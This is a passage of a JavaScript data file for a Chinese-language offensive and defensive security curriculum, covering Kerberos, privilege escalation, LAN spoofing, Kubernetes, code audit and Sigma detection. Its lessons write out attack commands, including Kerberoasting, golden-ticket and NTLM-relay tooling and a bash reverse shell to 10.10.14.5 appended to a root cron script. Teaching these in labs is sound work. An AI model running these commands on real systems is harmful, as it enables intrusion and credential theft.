+     exp:'把上面 20 行代码编译四次：默认、-fno-stack-protector、-no-pie、无 NX。每次都用同样的 payload 打一遍，记录哪一次成功、哪一次只崩溃、哪一次报 stack smashing detected。这四次对照会让你彻底记住每道防线拦的是什么。',
+     check:['能画出栈帧布局并标出缓冲区、canary、rbp、ret 的位置','能用 pattern 手工算出偏移而不是靠猜','能解释 ret2libc 与 ret2syscall 的适用差异'],
+     read:['《深入理解计算机系统》第 3 章','ROP Emporium 前 3 关（含官方解法对照）']},
+    {id:'t5',ic:'🔐',cat:'密码学',lv:'D3',time:'45 分钟',
+     title:'密钥派生、填充与 AEAD：真实系统里的密码学是怎么被用坏的',
+     q:'90% 的密码学漏洞不是算法被攻破，而是「用错了模式」或「比较用了 !=」。',
+     body:[
+      {h:'1. 哈希、HMAC、KDF 是三种不同的东西',p:'哈希（SHA-256）用于完整性，不抗暴力；HMAC 用密钥把哈希变成消息认证码，能防篡改；KDF（PBKDF2/bcrypt/scrypt/Argon2）故意慢，用于从口令派生密钥。把 SHA-256 当口令存储，等于给 GPU 送礼物——现代显卡每秒能算几十亿次，而 bcrypt 成本因子 12 每秒只有几千次。'},
+      {h:'2. 模式选错，加密等于没加密',p:'ECB 相同明文块产生相同密文块，能看出图片轮廓，也能做块重排攻击；CBC 需要随机 IV 且必须校验 MAC，否则可做填充预言（padding oracle）；CTR/GCM 的 nonce 绝不能复用，复用一次就能恢复明文异或关系。工程上的正确姿势是直接用 AEAD（AES-GCM / ChaCha20-Poly1305），不要自己拼「加密再哈希」。'},
+      {h:'3. 侧信道与比较逻辑',p:'用 == 比较 HMAC 会在第一个不同字节处提前返回，逐字节爆破即可伪造签名——正确做法是常量时间比较（hmac.compare_digest / crypto.timingSafeEqual）。同理，登录接口「用户不存在」和「密码错误」返回不同文案，就是用户名枚举；重置令牌用可预测的时间戳或自增 ID，就是账号接管的入口。'}
+     ],
+     code:{l:'python',t:'# 口令存储：错误 vs 正确\nimport hashlib, bcrypt\nbad  = hashlib.sha256(pw.encode()).hexdigest()          # 可被 GPU 高速爆破\nok   = bcrypt.hashpw(pw.encode(), bcrypt.gensalt(12))   # 慢 + 自带盐\n\n# 验证签名：错误 vs 正确\nif sig == expected:                 # 提前返回，存在时间侧信道\nif hmac.compare_digest(sig, expected):   # 常量时间\n\n# AES-GCM 正确用法（nonce 每次必须唯一）\nfrom cryptography.hazmat.primitives.ciphers.aead import AESGCM\nnonce = os.urandom(12); ct = AESGCM(key).encrypt(nonce, data, aad)   # 密文自带完整性\n\n# 填充预言的最小判定：只改最后一个字节，看错误类型是否不同\n# 只要「填充错误」与「解密失败」能被区分，就能逐字节解出明文'},
+     exp:'写两段脚本：第一段用 SHA-256 存 10 万个常见口令，测每秒尝试次数；第二段用 bcrypt cost=12 做同样的事。算出「一个 8 位口令在两种方案下被爆破的时间差」，这个数量级差就是为什么必须用 KDF。',
+     check:['能说清哈希、HMAC、KDF 各自解决什么问题','能解释 GCM nonce 复用为什么致命','能写出常量时间比较的必要性'],
+     read:['OWASP Password Storage Cheat Sheet','《Real-World Cryptography》第 4、6 章']},
+    {id:'t6',ic:'🎫',cat:'身份',lv:'D4',time:'50 分钟',
+     title:'信任是怎么传递的：NTLM、Kerberos、OAuth 与 SAML 的共同逻辑',
+     q:'所有身份攻击都在问同一个问题：谁签的票？票能被谁验证？验证时真的校验了所有字段吗？',
+     body:[
+      {h:'1. NTLM：挑战应答与它的历史包袱',p:'NTLM 是挑战-应答：服务端发 8 字节挑战，客户端用口令哈希加密挑战返回。问题在于这个哈希等价于口令（pass-the-hash），且协议不绑定目标服务（可中继到别的机器）。Net-NTLMv2 捕获后可以离线爆破，所以 Responder  poisoning 才有价值：先骗出认证，再爆破或中继。'},
+      {h:'2. Kerberos：票据体系与它的两类滥用',p:'Kerberos 用 KDC 签发 TGT（证明你是谁）和 TGS（证明你能访问某服务）。服务账号的密钥由口令派生，所以任何用户都能请求任意服务的 TGS 并离线爆破——这就是 Kerberoasting。反过来，如果拿到 KRBTGT 的哈希，就能伪造任意用户任意权限的 TGT（黄金票据），有效期可长达 10 年，且默认日志里看不出异常。'},
+      {h:'3. OAuth/SAML：把信任外包出去的代价',p:'OAuth 的授权码流程里，redirect_uri 校验不严就能把 code 送到攻击者域名；SAML 靠 XML 签名，若解析器允许签名包裹（XSW）或接受未签名断言，就能伪造任意身份。共同点是：协议本身没问题，实现方少校验了一个字段。审计这类系统的核心动作就是「把每个断言字段逐个删掉/改掉，看它是否还认」。'}
+     ],
+     code:{l:'bash',t:'# Kerberoasting：任何域用户都能请求服务票据并离线爆破\nimpacket-GetUserSPNs corp.local/user:pass -dc-ip 10.0.0.10 -request\nhashcat -m 13100 spn.txt rockyou.txt\n\n# AS-REP Roasting：不需要预认证的账号可直接拿到可爆破的密文\nimpacket-GetNPUsers corp.local/ -dc-ip 10.0.0.10 -no-pass -usersfile users.txt\nhashcat -m 18200 asrep.txt rockyou.txt\n\n# 黄金票据：拿到 krbtgt 哈希后可伪造任意 TGT\nimpacket-ticketer -nthash <krbtgt_hash> -domain-sid S-1-5-21-... -domain corp.local admin\n\n# 防御视角：这些攻击的日志特征分别是什么？\n# 4769（请求服务票据，加密类型 RC4 且量大）/ 4768 / 4624 类型 3 的异常来源'},
+     exp:'在 GOAD 或自建域里做一次完整闭环：先用 Responder 抓一个 Net-NTLMv2 并爆破，再用域内普通账号做 Kerberoasting，最后用 BloodHound 找一条到 Domain Admin 的最短路径。每步都记下「日志里长什么样」，这份对照表就是蓝队最想要的东西。',
+     check:['能画出 TGT / TGS 的签发与验证流程','能解释 pass-the-hash 与 pass-the-ticket 的区别','能说出 OAuth redirect_uri 校验的三种常见缺陷'],
+     read:['MITRE ATT&CK: Steal or Forge Kerberos Tickets','PortSwigger: OAuth 2.0 authentication vulnerabilities']},
+    {id:'t7',ic:'🐧',cat:'提权',lv:'D4',time:'45 分钟',
+     title:'Linux 权限的真实边界：uid、capabilities、namespace 与 seccomp',
+     q:'root 不是一个布尔值，而是一组能力的集合。理解这一点，才能理解容器逃逸。',
+     body:[
+      {h:'1. 从 uid 到 capabilities',p:'传统模型里 uid=0 就是神。但内核早已把 root 的权限拆成 40 多个 capability：CAP_NET_RAW 能抓包、CAP_SYS_ADMIN 几乎等于 root、CAP_DAC_READ_SEARCH 能绕过文件读权限。所以 SUID 提权之外，更隐蔽的是「某个二进制带了危险 capability」——getcap -r / 2>/dev/null 一跑，常能看到 python3 cap_setuid+ep 这种直接给 root 的配置。'},
+      {h:'2. 内核视角的隔离：namespace + cgroup + seccomp',p:'容器不是虚拟机，它只是被 namespace 遮住视图、被 cgroup 限住资源、被 seccomp 过滤系统调用的普通进程。所以逃逸的本质是「找到一个能越过 namespace 边界的接口」：挂载宿主目录、访问 docker.sock、利用需要 CAP_SYS_ADMIN 的挂载点、或直接打内核漏洞。'},
+      {h:'3. 提权排查的可复用清单',p:'固定顺序过一遍：sudo -l（含 NOPASSWD 与可写脚本）→ SUID/SGID → capabilities → cron 与 systemd timer → 可写的 PATH 目录 → 服务配置文件权限 → 内核版本与已知 CVE → 家目录里的凭据与历史命令。这个顺序不是背的，它对应「哪些机制能让普通用户以更高身份执行代码」。'}
+     ],
+     code:{l:'bash',t:'# 一条命令过一遍常见提权面\necho "== sudo =="; sudo -l 2>/dev/null\necho "== suid =="; find / -perm -4000 -type f 2>/dev/null\necho "== caps =="; getcap -r / 2>/dev/null\necho "== cron =="; ls -la /etc/cron* /var/spool/cron 2>/dev/null\necho "== writable =="; find / -writable -type d 2>/dev/null | grep -v proc\n\n# 容器内快速判断「我是不是容器、逃逸面在哪」\nls -la /.dockerenv; cat /proc/1/cgroup | head -3; capsh --print | head -5\nmount | grep -E "docker|overlay|proc"\n\n# 典型配置类提权：可写脚本被 root 的 cron 调用\necho "bash -i >& /dev/tcp/10.10.14.5/4444 0>&1" >> /opt/backup.sh'},
+     exp:'用 Docker 起一个普通容器，分别做三次实验：挂载 docker.sock、--privileged、挂载宿主 /etc。每次都在容器里尝试读取宿主文件或起一个新容器。做完你会对「容器隔离等级」有肌肉记忆，也会明白为什么 K8s 里 privileged 是红线。',
+     check:['能用 getcap 找到危险 capability 并说明利用方式','能解释容器逃逸的三类入口','能默写提权排查顺序并说明每一步对应哪个机制'],
+     read:['GTFOBins（每个二进制的滥用方式）','Linux capabilities 手册页 capabilities(7)']},
+    {id:'t8',ic:'🪟',cat:'提权',lv:'D4',time:'40 分钟',
+     title:'Windows 令牌与内核对象：为什么「以管理员运行」不等于 SYSTEM',
+     q:'Windows 的权限不是身份，而是令牌里的组、特权与完整性级别。',
+     body:[
+      {h:'1. 访问令牌里装了什么',p:'每个进程有一个主令牌：用户 SID、所属组、特权列表（SeDebugPrivilege 等）、完整性级别（Low/Medium/High/System）。UAC 的「管理员批准模式」让管理员平时跑在 Medium 完整性、权限被过滤的令牌里——这就是为什么你是管理员却读不了某些进程内存。'},
+      {h:'2. 从管理员到 SYSTEM 的经典路径',p:'只要拿到 SeDebugPrivilege，就能打开 SYSTEM 进程并窃取它的令牌（token impersonation）；只要某个以 SYSTEM 运行的服务其可执行文件路径未加引号（unquoted service path），就能在路径空隙里放一个同名程序；只要服务对普通用户有 SERVICE_CHANGE_CONFIG 权限，就能改它的 binPath。这三条覆盖了绝大多数 Windows 本地提权。'},
+      {h:'3. 为什么「打了补丁」还会被打',p:'提权漏洞分两类：一类是内核/组件漏洞（需补丁），一类是配置错误（补丁永远修不掉）。PowerUp / WinPEAS 输出的绝大多数条目属于第二类：服务权限、注册表可写、AlwaysInstallElevated、计划任务。所以真实项目里，配置审计的产出往往比漏洞利用更稳定。'}
+     ],
+     code:{l:'powershell',t:'# 当前令牌与特权\nwhoami /priv\nwhoami /groups | findstr "Mandatory Label"\n\n# 服务配置类提权检查（PowerUp）\nImport-Module .\\PowerUp.ps1\nInvoke-AllChecks\n\n# 未加引号的服务路径\nwmic service get name,pathname,startmode | findstr /i "Auto" | findstr /i /v "C:\\\\Windows"\n\n# 令牌窃取（需 SeDebugPrivilege，在授权环境使用）\n# 思路：找到以 SYSTEM 运行的进程 -> OpenProcess -> OpenProcessToken -> DuplicateToken -> CreateProcessAsUser\n\n# 计划任务与 AlwaysInstallElevated\nschtasks /query /fo LIST /v | findstr /i "TaskName Run As User"\nreg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated'},
+     exp:'在一台自建 Windows 10 虚拟机里，把自己降成一个普通域用户，用 WinPEAS 跑一遍，把输出按「配置类 / 补丁类」分类。然后手工复现其中一条配置类提权（例如可写服务目录），并写清「如果我是管理员，该怎么改配置才能堵住」。',
+     check:['能解释 UAC 过滤令牌与完整性的关系','能说出三条本地提权路径的触发条件','能把 WinPEAS 输出分成配置类与漏洞类'],
+     read:['Windows Internals 第 7 版 第 7 章（安全性）','PayloadsAllTheThings: Windows Privilege Escalation']},
+    {id:'t9',ic:'📡',cat:'内网',lv:'D3',time:'35 分钟',
+     title:'局域网的信任假设：ARP、DNS、LLMNR 与 IPv6 为什么都能被冒充',
+     q:'内网协议在设计时假设「同网段的人都是可信的」。这个假设一旦不成立，几乎每个协议都能被冒充。',
+     body:[
+      {h:'1. 无认证的解析协议',p:'ARP 没有认证，谁回答得快谁赢，于是可以声称「网关的 IP 在我这个 MAC 上」，流量就改道了。DNS 默认无签名，LLMNR/NBNS 是「谁先回答谁算」的广播查询——这就是 Responder 的工作原理：不是攻破什么，只是抢答。'},
+      {h:'2. IPv6 的默认开启是另一个入口',p:'很多内网只防了 IPv4，但 Windows 默认开启 IPv6 且优先。攻击者发 Router Advertisement 就能成为网段的 IPv6 路由器，进而下发 DNS，把流量引到自己这里。mitm6 就是干这个的，配合 WPAD 或 NTLM 中继效果极好。'},
+      {h:'3. 中继比爆破更划算',p:'抓到 Net-NTLMv2 只能离线爆破（口令复杂就废了），但 NTLM 中继是「实时把认证转发给另一台机器」，不需要知道口令。能否中继取决于目标是否开启了 SMB 签名、是否强制 LDAP 签名。所以内网评估的核心问题往往不是「怎么抓哈希」，而是「哪台机器没开签名」。'}
+     ],
+     code:{l:'bash',t:'# 被动监听（只读，先看清网段里有什么）\nresponder -I eth0 -A\n\n# 主动投毒（授权环境）\nresponder -I eth0 -wd\n\n# IPv6 接管，配合中继\nmitm6 -d corp.local\nimpacket-ntlmrelayx -6 -tf targets.txt -smb2support\n\n# 判断能不能中继：签名开关\nnmap -p445 --script smb2-security-mode 10.0.0.0/24\nrpcclient -U "" 10.0.0.10 -c "getdompwinfo"   # 看 LDAP 签名要求'},
+     exp:'用两台虚拟机做一个最小实验：A 开 Responder，B 尝试访问一个不存在的共享名。观察 B 自动发 LLMNR 查询、A 抢答、B 送出 Net-NTLMv2 的全过程，用 Wireshark 抓包对照。然后关掉 LLMNR 再试，确认攻击失效。',
+     check:['能解释 ARP 欺骗与 LLMNR 抢答的共同弱点','能说出 NTLM 中继成立的两个前提','能给出三条内网加固措施并说明拦的是哪类攻击'],
+     read:['MITRE ATT&CK: Adversary-in-the-Middle','《内网安全攻防》第 2、4 章']},
+    {id:'t10',ic:'☸️',cat:'云原生',lv:'D4',time:'45 分钟',
+     title:'Kubernetes 的信任边界：ServiceAccount、RBAC 与准入控制',
+     q:'K8s 里没有「root」，只有「这个 token 能调哪些 API」。逃逸的本质是拿到更强的 token 或落到更强的节点。',
+     body:[
+      {h:'1. Pod 里的 token 就是身份',p:'每个 Pod 自动挂载 ServiceAccount token（/var/run/secrets/kubernetes.io/serviceaccount/token），用它调 API Server。如果这个 SA 绑了 list secrets 或 create pods 权限，攻击者就能读全部 Secret 或在集群里起新 Pod——很多「K8s 沦陷」其实就是一次过度授权。'},
+      {h:'2. 从 Pod 到节点的三条路',p:'hostPath 挂载宿主目录（直接读写宿主文件系统）、privileged 容器（能挂载设备、改内核参数）、hostNetwork + hostPID（能看宿主进程、抓宿主流量）。这三条都属于「配置即漏洞」，准入控制（PSP 的后继者 Pod Security Standards / OPA Gatekeeper）才是真正的护栏。'},
+      {h:'3. 供应链与镜像',p:'镜像里的基础层、CI 的构建凭据、Helm chart 的 values、以及 admission webhook 本身，都是攻击面。真实案例里「在 CI 里投毒镜像，等集群拉取」比「现场打 Pod」更常见。审计时看：镜像是否固定 digest、是否以 root 运行、是否有 latest 标签。'}
+     ],
+     code:{l:'bash',t:'# 拿到 Pod 后第一步：我能调什么？\nTOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)\nkubectl --token=$TOKEN auth can-i --list\n\n# 常见的高危权限\n#   list/get secrets        -> 读全部凭据\n#   create pods             -> 起特权 Pod 挂宿主\n#   create clusterrolebinding -> 直接给自己提权\n\n# 判断是否 privileged / 挂了宿主目录\ncat /proc/1/status | grep CapEff\nmount | grep -E "host|/var/lib/kubelet"\n\n# 用 RBAC 做最小权限：只给需要的 verb 和 resource\nkubectl create role pod-reader --verb=get,list --resource=pods\n\n# 准入控制：禁止特权与 hostPath（Pod Security Standards）\nkubectl label ns prod pod-security.kubernetes.io/enforce=restricted'},
+     exp:'用 kind 或 k3d 起一个本地集群，故意建一个绑了 cluster-admin 的 ServiceAccount 给一个 Pod，然后在 Pod 里读 Secret、起特权 Pod 挂宿主根目录。做完再把这个 SA 改成只读 pods，重试一次，确认攻击链断在哪一步。',
+     check:['能说出 Pod 内 token 的位置与用途','能列出三条 Pod → Node 的逃逸路径','能用 RBAC 写出一条最小权限规则'],
+     read:['Kubernetes 官方文档：RBAC 与 Pod Security Standards','MITRE ATT&CK for Containers']},
+    {id:'t11',ic:'🔬',cat:'研究',lv:'D5',time:'60 分钟',
+     title:'漏洞挖掘方法论：攻击面枚举、差分测试与代码审计模式',
+     q:'挖不到漏洞通常不是技术不够，而是没有系统地列出「哪些输入会进入哪些危险函数」。',
+     body:[
+      {h:'1. 先建攻击面清单，再动手',p:'把目标拆成四类入口：HTTP 参数/头/Cookie、文件与上传、协议与端口、第三方集成（webhook、OAuth 回调、SAML）。对每个入口记录三件事：谁解析它、解析后流向哪、有没有鉴权。这份表比任何工具输出都重要，因为它决定你去哪里花时间。'},
+      {h:'2. 代码审计靠「模式」而不是通读',p:'高效审计是搜索危险 sink 再反查数据流：Java 找 Runtime.exec / 反序列化 readObject / SpEL；PHP 找 include、unserialize、assert、preg_replace /e；Node 找 child_process、eval、模板拼接；Python 找 pickle、yaml.load、subprocess(shell=True)。找到 sink 后问：这个参数能被外部控制吗？中间有没有过滤？过滤是否可绕？'},
+      {h:'3. 差分测试与模糊测试的位置',p:'差分测试适合「同一输入在不同实现下表现不同」的场景（解析器、序列化、鉴权中间件），也是请求走私、参数污染类漏洞的发现方式。Fuzz 适合二进制与协议解析，关键在种子质量与覆盖率反馈（AFL++、libFuzzer）。而逻辑漏洞只能靠人：把业务流程画成状态机，找「能跳过某个状态」的路径。'}
+     ],
+     code:{l:'bash',t:'# 审计第一步：把危险函数捞出来（Java 示例）\nrg -n "Runtime\\.getRuntime|ProcessBuilder|readObject|SpelExpressionParser|ScriptEngine" --type java\n\n# PHP 高危 sink\nrg -n "unserialize\\(|include\\s*\\(|assert\\(|preg_replace\\(.*/e|system\\(|shell_exec\\(" --type php\n\n# Fuzz 最小闭环（AFL++）\nafl-clang-fast target.c -o target\nafl-fuzz -i seeds/ -o out/ -- ./target @@\n\n# 覆盖率看什么\nafl-whatsup out/    # 看 paths 增长速度：不涨说明种子或字典该换了\n\n# 逻辑漏洞：把流程写成状态机再找跳转\n# 下单 -> 支付 -> 发货   能否直接跳到「发货」？能否把已支付订单改回未支付？'},
+     exp:'选一个你熟悉的中小型开源项目（PHP 或 Java），先用 rg 列出所有危险 sink，挑 5 个追数据流，写出「可控/不可控」的判断依据。目标不是挖到 CVE，而是练出「3 分钟内判断这个 sink 值不值得深挖」的直觉。',
+     check:['能为一个目标列出完整攻击面清单','能背出四类语言的高危 sink 清单','能解释差分测试最适合发现哪类漏洞'],
+     read:['《代码审计：企业级 Web 代码安全架构》','AFL++ 官方文档：fuzzing 101']},
+    {id:'t12',ic:'🛡',cat:'蓝队',lv:'D4',time:'45 分钟',
+     title:'检测工程：把一次攻击翻译成可复用的检测规则',
+     q:'红队证明「能进来」，蓝队要证明「进来会被看见」。看见的前提是把行为映射到数据源。',
+     body:[
+      {h:'1. 先问「这个动作会留下什么」',p:'任何攻击动作都会触碰某个系统调用或API：进程创建（Sysmon 1 / 4688）、网络连接（Sysmon 3）、文件写入（11）、注册表修改（13）、服务安装（7045）、票据请求（4769）。找不到数据源的动作，等于不可检测——这时要做的是补日志，而不是写规则。'},
+      {h:'2. 从行为到规则：Sigma 的写法',p:'Sigma 是厂商无关的检测描述语言，能编译成 Splunk/Elastic/Sentinel 查询。一条好规则要有：明确的 logsource、少量高区分度字段、以及「为什么这样写」的注释。切忌只写 CommandLine contains "mimikatz"——改个名字就绕过了；应该写行为组合，例如「非浏览器进程访问 lsass 句柄」。'},
+      {h:'3. 用 ATT&CK 做覆盖度地图',p:'把规则映射到 ATT&CK 技术编号，就能看出覆盖盲区：执行和持久化规则很多，凭据访问和横向移动往往空白。评估检测能力不要数规则条数，而要数「能覆盖多少个技术、每个技术是否有至少一条高置信规则」。最后一定要做验证：用 Atomic Red Team 跑一遍，看规则是否真的触发。'}
+     ],
+     code:{l:'yaml',t:'# Sigma 规则骨架：LSASS 访问（凭据访问 T1003.001）\ntitle: Suspicious LSASS Access by Non-System Process\nid: 3f2a-...\nstatus: experimental\nlogsource:\n  product: windows\n  category: process_access\ndetection:\n  selection:\n    TargetImage|endswith: \'\\\\lsass.exe\'\n    GrantedAccess|contains:\n      - \'0x1010\'\n      - \'0x1410\'\n  filter_main:\n    SourceImage|startswith:\n      - \'C:\\\\Windows\\\\System32\\\\\'\n      - \'C:\\\\Program Files\\\\Windows Defender\\\\\'\n  condition: selection and not filter_main\nlevel: high\n\n# 验证：先跑原子测试，再确认规则触发\n# atomic-operator run -a T1003.001'},
+     exp:'选一个你上一节做过的攻击动作（例如 Kerberoasting），写出它的完整数据源清单与一条 Sigma 规则，然后用 Atomic Red Team 或手工复现触发它。如果规则没响，先怀疑数据源没开，再怀疑字段写错——这个排查过程就是检测工程师的日常。',
+     check:['能把一个 ATT&CK 技术映射到具体日志字段','能写出带过滤条件、误报可控的 Sigma 规则','能说明为什么「关键字匹配」是坏规则'],
+     read:['Sigma 官方规范','MITRE ATT&CK 与 Atomic Red Team']},
+    /*__MS_A__*/
+  ],
+  projects:[
+    {id:'p1',ic:'🏗',lv:'D3',time:'2 周',title:'自建一条内网攻击链（外网 → 域控）',
+     why:'把所有零散技能压进一个项目，是唯一能把「会」变成「熟」的方式。',
+     steps:['用 VMware/VirtualBox 搭 4 台机：Kali 攻击机、一台对外 Web（Linux）、一台内网 Windows、一台 DC（可用 GOAD 精简版）','在 Web 上故意留一个入口（上传或注入），自己写这 20 行有漏洞的代码','从外网打点 → 拿 shell → 提权 → 抓凭据 → 横向 → 拿域管，每一步都截图并记下命令','全程用 Wireshark 抓包，标注哪一步流量最可疑','最后写一份 15 页报告：攻击路径图、时间线、每个漏洞的根因、修复建议'],
+     del:'攻击链图 + 命令时间线 + 15 页报告 + 一段 10 分钟讲解录音（讲给不懂安全的人听）'},
+    {id:'p2',ic:'🛠',lv:'D4',time:'1 周',title:'写一个 SQL 注入检测器（带自己的 tamper）',
+     why:'用工具的人知道 payload，写工具的人知道边界条件——后者才是能进大厂安全岗的能力。',
+     steps:['用 Python 写一个最小爬虫，收集带参数的 URL','对每个参数注入布尔差异探测（真/假两种 payload 比较响应相似度）','实现时间盲注探测（sleep 差异 + 三次取中位数，避免网络抖动误判）','加去重与限速，避免把自己靶场打挂','写 3 个 tamper（注释绕过 / 大小写混写 / 内联注释），在 DVWA 四档难度上测通过率'],
+     del:'可运行代码 + 在 DVWA 四档上的通过率表格 + 误报分析（哪些页面会误判、为什么）'},
+    {id:'p3',ic:'🔌',lv:'D4',time:'1 周',title:'写一个 Burp 插件：自动发现越权（IDOR）',
+     why:'越权是真实项目里出现频率最高、工具覆盖最差的漏洞类别，写插件是理解它的最快路径。',
+     steps:['搭好 Burp 插件开发环境（Java + Montoya API，或 Python 版 Jython 方案）','监听 Proxy 历史，把请求按「路径 + 参数名」聚类，识别数字/ID 型参数','用两个不同权限的账号（A/B）自动重放：A 的请求换 B 的 cookie，比较状态码与响应长度','对疑似越权做二次确认，避免把正常的 200 误报成漏洞','输出报告：请求原文、两账号响应差异、判定理由'],
+     del:'插件源码 + 在 Juice Shop 或自建双账号系统上的检出结果 + 一篇插件设计说明'},
+    {id:'p4',ic:'💥',lv:'D5',time:'3 周',title:'从 Fuzz 到 PoC：完整走一遍漏洞发现流程',
+     why:'这是「安全研究者」和「安全工程师」的分水岭：能不能独立发现一个未知问题。',
+     steps:['选一个小型开源解析器（图片、文档、协议均可），读它的解析入口','用 AFL++ 或 libFuzzer 建 fuzz 闭环，准备高质量种子与字典','跑出崩溃样本后用 ASAN 定位：是越界读、UAF 还是整数溢出','用 gdb 复现崩溃，算出可控偏移，写出能稳定触发的 PoC','评估影响（能否 RCE / 只是 DoS），按厂商流程提交，写清复现步骤与修复建议'],
+     del:'崩溃样本 + ASAN 报告 + PoC 脚本 + 一份可直接提交的漏洞报告（含影响评估）'},
+    {id:'p5',ic:'🛰',lv:'D4',time:'1 周',title:'建一个检测实验室：Sysmon + Sigma + 原子测试',
+     why:'只会打不会看，永远做不了防守方；检测能力必须能被验证，否则只是自我安慰。',
+     steps:['在 Windows 虚拟机装 Sysmon 并加载完整配置（SwiftOnSecurity 或 Olaf 版）','用 Wazuh / Elastic 收集日志，确认 4688、Sysmon 1/3/11/13 都有数据','写 5 条 Sigma 规则，覆盖执行、持久化、凭据访问、横向移动、C2','用 Atomic Red Team 逐条触发，记录「触发了/没触发/误报」','对没触发的规则追查原因：数据源缺失、字段写错、还是行为确实不同'],
+     del:'检测矩阵表（技术 × 规则 × 是否触发 × 误报率）+ 3 条改进后的规则'},
+    {id:'p6',ic:'☁️',lv:'D4',time:'1 周',title:'云上一条链：从 SSRF 到云凭据再到横向',
+     why:'云环境把「边界」从网络换成了 IAM，攻击路径完全不同，必须专门练。',
+     steps:['用 LocalStack 或真实云免费额度搭一台带 IMDS 的实例','写一个存在 SSRF 的应用，通过 169.254.169.254 获取实例角色临时凭据','用拿到的凭据枚举权限（aws sts get-caller-identity、枚举 S3/EC2）','找过度授权点（能读 Secret、能改策略、能起新实例）实现横向','写清最小权限修复方案，并用 IAM Policy 验证修复有效'],
+     del:'攻击链复现文档 + 拿到的凭据类型说明 + 修复前后的 IAM 策略对比'},
+    {id:'p7',ic:'🏁',lv:'D5',time:'1 周',title:'出一道 CTF 题并写官方题解',
+     why:'出题是最高强度的自测：你必须知道所有错误路径，才能设计出唯一正确的那条。',
+     steps:['选一个知识点（例如「看似过滤了 union，其实只过滤了小写」）','写出题面、附件与部署脚本（Dockerfile + docker-compose）','自己先写一遍预期解法，确认 30 分钟内可解','找一个人试玩，记录他卡在哪——卡点就是题目难度是否合理的证据','写官方题解，并列出 3 种常见错误思路及为什么走不通'],
+     del:'可一键部署的题目 + 官方题解 + 试玩者反馈记录（含难度调整理由）'},
+    {id:'p8',ic:'📝',lv:'D4',time:'1 周',title:'做一次真实代码审计并出报告',
+     why:'把「扫到告警」变成「论证可利用性」，是安全岗位最值钱的一项能力。',
+     steps:['选一个 1 万行以上的开源项目，先画架构图与入口清单','用 Semgrep / CodeQL 跑一遍，把结果按「可疑度」排序','对前 10 条逐个追数据流，判断输入是否真的可控','对确认的问题写出 PoC（本地跑起来），对误报写清「为什么不可控」','产出报告：问题列表、危害分级、修复补丁（给出 diff）'],
+     del:'审计报告 + 可复现 PoC + 至少一个修复 PR（diff 形式即可）'}
+  ],
+  drills:[
+    {t:'命令肌肉记忆',f:'每天',ti:'15 分钟',d:'盲打 nmap / grep / awk / curl 组合命令各 3 遍，不看笔记。目标是「想到就能敲出来」。'},
+    {t:'一页原理',f:'每天',ti:'10 分钟',d:'挑一个当天用到的参数或协议字段，查 RFC/源码，用自己的话写 150 字解释，写不出就说明没懂。'},
+    {t:'靶机复盘',f:'每周',ti:'1 台',d:'打完一台机器，合上 writeup 重写一遍攻击链；再对照差距，把「没想到的点」记进错题本。'},
+    {t:'读一段源码',f:'每周',ti:'30 分钟',d:'读一个有漏洞的开源项目的那 30 行，画出数据流，标出过滤发生在哪一层。'},
+    {t:'写一条规则',f:'每周',ti:'40 分钟',d:'把本周做过的一个攻击动作翻译成 Sigma/YARA 规则，并用原子测试验证它能触发。'},
+    {t:'造一个小工具',f:'每月',ti:'1 个',d:'用 100 行以内代码解决一个重复劳动（批量请求、结果去重、报告生成）。'},
+    {t:'公开输出',f:'每月',ti:'1 篇',d:'写一篇技术笔记或复盘，要求：别人照着能复现。写不出来通常代表理解有断层。'},
+    {t:'对抗演练',f:'每季',ti:'1 次',d:'红蓝互打：自己打自己建的靶场，再自己写检测规则抓自己。这是成长最快的一环。'}
+  ],
+  qa:[
+    {g:'原理类（决定你能不能下沉到 L3/L4）',items:[
+      {q:'为什么参数化查询能防注入，而「转义引号」不能？',a:'参数化把输入绑定在执行阶段，语法树在绑定前就已固定，输入永远只是值；转义只是改变字符形态，一旦编码层与解析层不一致（多字节、二次解码、数字型注入），转义就失效。'},
+      {q:'同源策略到底限制了什么，没限制什么？',a:'限制的是「跨源读取响应内容」与「跨源访问 DOM」；不限制的是「跨源发起请求」（表单、img、script 都能发）。所以 CSRF 能成立，而 XSS 的危险在于它让你在源内执行，绕过了前一条限制。'},
+      {q:'为什么 ASLR 需要配合信息泄漏才有意义？',a:'ASLR 只增加随机性，不阻止利用。只要泄漏一个模块地址，就能算出基址，链上其余地址随之确定。所以「有泄漏点 + 有溢出」等于 ASLR 失效。'},
+      {q:'Kerberos 的 TGS 为什么任何用户都能请求？',a:'因为服务票据由服务账号密钥加密，KDC 只是代为签发；设计上假设「拿到票据也无法解密」。但票据可离线爆破口令，于是这个设计假设在现代算力下失效，这就是 Kerberoasting。'},
+      {q:'容器逃逸的本质是什么？',a:'容器只是被 namespace 隔离、被 cgroup 限制、被 seccomp 过滤的普通进程。逃逸就是找到一个能越过这些边界的接口：宿主挂载、docker.sock、特权能力或内核漏洞。'}
+    ]},
+    {g:'实战判断类（决定你会不会在真实目标上浪费时间）',items:[
+      {q:'拿到一个登录框，你的前三个动作是什么？',a:'一看响应差异（用户名枚举）、二看是否有速率限制与锁定策略、三看流程里的 token 与跳转（能否绕过多因素）。直接上字典爆破通常是最后手段。'},
+      {q:'扫端口只开了 80/443，还要继续吗？',a:'要。看子域名、看 vhost、看历史解析记录、看 JS 里的接口与第三方域名。真实项目里大量资产不在主域上，信息收集的收益远高于在单点上硬挖。'},
+      {q:'怎么判断一个 SQL 注入「值得挖」？',a:'看它能否读出数据（回显/布尔/时间）、当前数据库权限、能否堆叠或读写文件。如果只能确认存在但读不出任何东西，优先级应该降低。'},
+      {q:'上传点拿到 shell 后，第一件事做什么？',a:'确认身份与网络位置（whoami、ip a、能否出网），然后立刻稳定化（反弹到可控端口、留备用通道），再做信息收集。顺序错了容易丢 shell。'},
+      {q:'拿到域内普通账号，先做什么？',a:'先摸清结构：BloodHound 采一遍，看从当前账号到高价值目标的最短路径，而不是盲目扫端口。方向比速度重要。'}
+    ]},
+    {g:'工程与沟通类（决定你能不能交付）',items:[
+      {q:'报告里「高危」的判定标准是什么？',a:'不是 CVSS 分数，而是「谁能利用 + 需要什么前提 + 影响什么数据/权限」。同一漏洞在内网和外网的定级可以差两级，写清前提才有说服力。'},
+      {q:'客户说「这个漏洞我们内部已知」，你怎么回？',a:'不争论，回到证据：给出复现步骤、影响范围、以及「已知但未修」的风险留痕。把技术问题转成决策记录，是专业度的体现。'},
